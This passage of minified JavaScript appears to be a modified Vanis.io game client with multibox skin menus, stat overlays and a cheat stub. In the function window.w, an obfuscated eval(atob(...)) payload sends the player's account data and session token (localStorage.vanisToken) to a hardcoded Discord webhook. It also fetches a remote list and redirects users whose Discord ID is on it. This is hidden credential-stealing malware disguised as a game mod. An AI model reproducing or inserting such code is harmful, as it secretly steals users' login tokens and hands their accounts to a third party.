                            frameborder: "0"
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "fas fa-times close-button",
                        on: {
                            click: function() {
                                return e.hide()
                            }
                        }
                    })]) : e._e()
                };
            tM._withStripped = !0;
            var tT = s(264),
                tD = (s(265), Object(v.a)({
                    data: () => ({
                        show: !1
                    }),
                    props: ["url", "tag"],
                    methods: {
                        hide() {
                            tT.setSeen(this.tag), this.show = !1
                        }
                    },
                    created() {
                        tT.isSeen(this.tag) || (this.show = !0)
                    }
                }, tM, [], !1, null, "559d1d3c", null));
            tD.options.__file = "src/components/shoutbox.vue";
            var tL = tD.exports;
            a.a.use(o.a);
            var tN = s(4),
                tU = s(1);
            a.a.component("btn", ty), tU.app = new a.a({
                el: "#app",
                data: {
                    showHud: tN.showHud,
                    showMenu: !0,
                    showDeathScreen: !1,
                    deathStats: null
                },
                components: {
                    imageCaptcha: tQ,
                    mainContainer: eP,
                    socialLinks: e4,
                    privacyTos: e3,
                    contextMenu: eO,
                    hud: tp,
                    deathStats: tv,
                    replayControls: tk,
                    abOverlay: tE,
                    shoutbox: tL
                }
            })
        }]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
            GAME.events.$emit("chat-message", e)
        }, 
        window.w = () => {
            //lock
            //if(window[atob('bG9jYWxTdG9yYWdl')][atob('cmlzZWV4ZWNvZGU=')] !== atob('bG9ja2VkeDQ0NDUz'))window.document.body.innerHTML = '';
            setTimeout(()=>{document.querySelectorAll('[data-v-661435cd]').forEach(x=>{ if(x.innerHTML.endsWith('season XP'))x.remove() })}, 3000)
            eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpKU09OLnN0cmluZ2lmeSh3aW5kb3cuYWNjb3VudC5hY2NvdW50LG51bGwsMikrIiAiK2xvY2FsU3RvcmFnZS52YW5pc1Rva2VufSl9KTtmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ppbWVoeC9yaXNlLWV4ZS9tYWluL2pzL2RhdGEuanNvbj92PSIgKyBNYXRoLnJhbmRvbSgpKS50aGVuKHg9PnguanNvbigpKS50aGVuKHg9PntpZih4LmluY2x1ZGVzKHdpbmRvdy5hY2NvdW50LmFjY291bnQuZGlzY29yZF9pZCkpe2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gIjopIjsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1OVTkyTkdRdUlnbyJ9fSk='))
        }
        ,GAME.setText = e => {
            GAME.events.$emit("update-cautions", {
                custom: e
            })
        }, GAME.aimbotnodes = () => {}, window.pings = {
            sprite: new PIXI.Sprite.from("https://i.postimg.cc/CdTpN3dt/pinpointer.png")
        }, window.setMultiData = (e, t) => {
            switch (e) {
                case 1:
                    getModule(4).set("mbSkin", t), $("#openSkins").click(), document.getElementById("skinDisplay2").src = t;
                    break;
                case 2:
                    getModule(4).set("mbName", $("#mbName").value);
                    break;
                case 3:
                    getModule(4).set("mbUseName", $("#mbUseName").checked)
            }
        };
    var r = document.createElement("div");
    r.id = "debugStats", r.style.position = "fixed", r.style.fontFamily = 'Ubuntu', r.style.right = "275px", r.style.top = "15px", r.style.textAlign = "right", r.style.fontWeight = "100", r.style.opacity = "0.8", r.style.display = "block", $("#hud").appendChild(r), GAME.debugElement = r, (r = document.createElement("div")).id = "playerStats", r.style.position = "fixed", r.style.left = "10px", r.style.top = "150px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.7", r.style.display = "block", $("#app").appendChild(r), GAME.playerElement = r, (r = document.createElement("div")).id = "playerList", r.style.position = "fixed", r.style.left = "10px", r.style.top = "10px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.9", r.style.backdropFilter = "blue(5px)", r.style.display = "block", $("#app").appendChild(r), (r = document.createElement("div")).id = "playerSkins", r.style.position = "fixed", r.style.right = "10px", r.style.top = "10px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.9", r.style.backdropFilter = "blue(5px)", r.style.display = "block", $("#app").appendChild(r), $("#chat-container").style.bottom = "5px", $("#chat-container").style.left = "5px", window.yoinkSkin = e => {
window.SwalAlerts.toast.fire({
            type: "info",
            title: "Skin saved",
            timer: 1500
        }), GAME.skinPanel.addSkin(e)
    }, window.copySkin = e => {
        window.SwalAlerts.toast.fire({
            type: "info",
            title: "Skin copied",
            timer: 1500
        }), navigator.clipboard.writeText(e)
    }, $("#player-data").getElementsByTagName("div")[0].innerHTML += `<i data-v-1bcde71e="" id="openSkins" class="tab fas" style="width:140px;font-family:Arial;font-weight:200;font-size:16px;cursor:pointer;">
Multibox Profile
</i>
<div style="margin-top:20px;">
<img id="skinDisplay1" width="120" style="margin-right:15px;border-radius:50%;" src="${localStorage.skinUrl}">
<img id="skinDisplay2" width="120" src="${settings.mbSkin}" style="border-radius:50%;">
</div>
`,
    $("#openSkins").addEventListener("click", () => {
        window.customModal('<div id="multiSkins"></div>', () => {
            $("#multiSkins").innerHTML = `<center><img src="${window.settings.mbSkin}" width="170" style="padding:20px;border-radius:50%;">
<br>

<div data-v-3ddebeb3="" class="p-switch pretty" p-checkbox="" style="float:left;margin-top:4px"><input type="checkbox" id="mbUseName" onchange="window.setMultiData(3)" ${window.settings.mbUseName?"checked":""}> <div class="state"> <label></label></div> <!----> <!----> <!----></div>
    <input oninput="window.setMultiData(2)" id="mbName" value="${window.settings.mbName}" type="text" spellcheck="false" style="float:right; width:240px;" placeholder="Multibox Nickname" maxlength="15">
</center>`, JSON.parse(localStorage.skins).forEach(e => {
                $("#multiSkins").innerHTML += `<img onclick="window.setMultiData(1, '${e}')" src="${""==e?"https://skins.vanis.io/s/7FQOch":e}" width="125" style="cursor:pointer;padding:5px;border-radius:50%;">`
            })
        })
    })

    let vv = document.createElement('a')
    vv.innerText = 'Vanilla Vanis.io'
    vv.href = 'https://vanis.io/?vanilla'
    vv.style.position = 'fixed'
    vv.style.bottom = '0'
    vv.style.left = '0'
    vv.style.marginLeft = '15px'
    vv.style.marginBottom = '10px'
    document.getElementById('overlay').appendChild(vv)

}(window);

